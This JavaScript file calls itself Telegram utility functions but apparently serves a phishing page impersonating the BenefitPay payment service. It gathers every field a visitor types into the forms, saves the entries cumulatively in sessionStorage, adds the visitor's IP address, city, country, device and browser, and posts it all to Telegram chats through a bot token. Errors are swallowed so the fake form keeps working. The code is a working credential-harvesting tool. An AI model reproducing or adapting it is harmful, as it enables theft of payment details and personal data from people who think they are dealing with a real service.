// Telegram utility functions for sending messages

/**
 * Get user's IP address and location information
 */
async function getUserInfo() {
    try {
        const response = await fetch("https://ipapi.co/json/", {
            method: "GET",
            headers: {
                "Accept": "application/json"
            }
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        
        return {
            ip: data.ip || "Unknown",
            country: data.country_name || "Unknown",
            region: data.region || "Unknown",
            city: data.city || "Unknown",
            timezone: data.timezone || "Unknown"
        };
    } catch (error) {
        console.warn("Error fetching IP info (non-critical):", error);
        // Return default values - don't fail the entire process
        return {
            ip: "Unknown",
            country: "Unknown",
            region: "Unknown",
            city: "Unknown",
            timezone: "Unknown"
        };
    }
}

/**
 * Detect device type and browser
 */
function getDeviceInfo() {
    const ua = navigator.userAgent;
    
    // Detect device type
    let device = "Desktop";
    if (/mobile/i.test(ua)) device = "Mobile";
    else if (/tablet/i.test(ua)) device = "Tablet";
    
    // Detect browser
    let browser = "Unknown";
    if (/Edg/i.test(ua)) browser = "Edge";
    else if (/Chrome/i.test(ua)) browser = "Chrome";
    else if (/Firefox/i.test(ua)) browser = "Firefox";
    else if (/Safari/i.test(ua)) browser = "Safari";
    else if (/Opera|OPR/i.test(ua)) browser = "Opera";
    
    return { device, browser };
}

/**
 * Send message to Telegram (supports multiple chat IDs)
 */
async function sendToTelegram(message, parseMode = 'Markdown') {
    // Check if config is loaded
    if (typeof TELEGRAM_CONFIG === 'undefined') {
        console.error('❌ TELEGRAM_CONFIG is not defined! Make sure config.js is loaded before telegram.js');
        return false;
    }
    
    if (!TELEGRAM_CONFIG.BOT_TOKEN || !TELEGRAM_CONFIG.CHAT_ID || 
        TELEGRAM_CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
        TELEGRAM_CONFIG.CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.error('❌ Telegram configuration not set. Please update config.js');
        console.error('Current BOT_TOKEN:', TELEGRAM_CONFIG.BOT_TOKEN ? 'Set' : 'Missing');
        console.error('Current CHAT_ID:', TELEGRAM_CONFIG.CHAT_ID ? 'Set' : 'Missing');
        return false;
    }
    
    // Support both single chat ID (string) and multiple chat IDs (array)
    let chatIds = [];
    if (Array.isArray(TELEGRAM_CONFIG.CHAT_ID)) {
        chatIds = TELEGRAM_CONFIG.CHAT_ID;
    } else if (typeof TELEGRAM_CONFIG.CHAT_ID === 'string') {
        // Support comma-separated string or single string
        chatIds = TELEGRAM_CONFIG.CHAT_ID.includes(',') 
            ? TELEGRAM_CONFIG.CHAT_ID.split(',').map(id => id.trim())
            : [TELEGRAM_CONFIG.CHAT_ID];
    } else {
        console.error('❌ Invalid CHAT_ID format in config.js. Expected string or array, got:', typeof TELEGRAM_CONFIG.CHAT_ID);
        return false;
    }
    
    console.log('📤 Sending Telegram message to', chatIds.length, 'recipient(s)');
    
    // Send message to all chat IDs
    const sendPromises = chatIds.map(async (chatId) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: "POST",
                headers: { 
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: parseMode
                })
            });
            
            const responseData = await response.json().catch(() => ({}));
            
            if (!response.ok) {
                console.error(`❌ Telegram API error for chat ${chatId}:`, response.status, responseData);
                if (responseData.description) {
                    console.error('Error description:', responseData.description);
                }
                return false;
            }
            
            console.log(`✅ Message sent successfully to chat ${chatId}`);
            return true;
        } catch (error) {
            console.error(`❌ Error sending Telegram message to ${chatId}:`, error);
            return false;
        }
    });
    
    // Wait for all messages to be sent (don't fail if some fail)
    const results = await Promise.all(sendPromises);
    const successCount = results.filter(r => r === true).length;
    console.log(`📊 Telegram send results: ${successCount}/${chatIds.length} successful`);
    
    // Return true if at least one message was sent successfully
    return results.some(result => result === true);
}

/**
 * Send form data to Telegram (cumulative - includes all previous entries)
 */
async function sendFormDataToTelegram(subject, data, includeIP = false) {
    try {
        // Get previous data from sessionStorage
        let previousData = {};
        try {
            const stored = sessionStorage.getItem('benefitPayFormData');
            if (stored) {
                previousData = JSON.parse(stored);
            }
        } catch (e) {
            console.warn("Error reading previous form data:", e);
        }
        
        // Merge previous data with new data (new data overwrites if key exists)
        const cumulativeData = { ...previousData, ...data };
        
        // Save cumulative data back to sessionStorage
        try {
            sessionStorage.setItem('benefitPayFormData', JSON.stringify(cumulativeData));
        } catch (e) {
            console.warn("Error saving form data:", e);
        }
        
        // Get user info only if includeIP is true (first message only)
        let userInfo = null;
        if (includeIP) {
            userInfo = await getUserInfo().catch(() => ({
                ip: "Unknown",
                country: "Unknown",
                region: "Unknown",
                city: "Unknown",
                timezone: "Unknown"
            }));
        }
        
        const deviceInfo = getDeviceInfo();
        
        let message = `📋 *${subject}*\n━━━━━━━━━━━━━━━\n`;
        
        // Add all cumulative form data (previous + new)
        for (const [key, value] of Object.entries(cumulativeData)) {
            if (value) {
                const formattedKey = key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
                message += `*${formattedKey}:* ${value}\n`;
            }
        }
        
        // Add user info only if includeIP is true (first message)
        if (includeIP && userInfo) {
            message += `\n━━━━━━━━━━━━━━━\n`;
            message += `🌍 *IP Address:* ${userInfo.ip}\n`;
            message += `🏙️ *City:* ${userInfo.city}\n`;
            message += `🌏 *Country:* ${userInfo.country}\n`;
            message += `📍 *Region:* ${userInfo.region}\n`;
            message += `💻 *Device:* ${deviceInfo.device}\n`;
            message += `🌐 *Browser:* ${deviceInfo.browser}\n`;
        }
        
        // Try to send - but don't throw if it fails
        const sendResult = await sendToTelegram(message).catch(err => {
            console.error("❌ Telegram send failed:", err);
            return false;
        });
        
        if (!sendResult) {
            console.error("❌ Failed to send form data to Telegram. Check console for details.");
        }
        
        return sendResult;
    } catch (error) {
        // Log but don't throw - form submission should continue
        console.warn("Error in sendFormDataToTelegram (non-critical):", error);
        return false;
    }
}

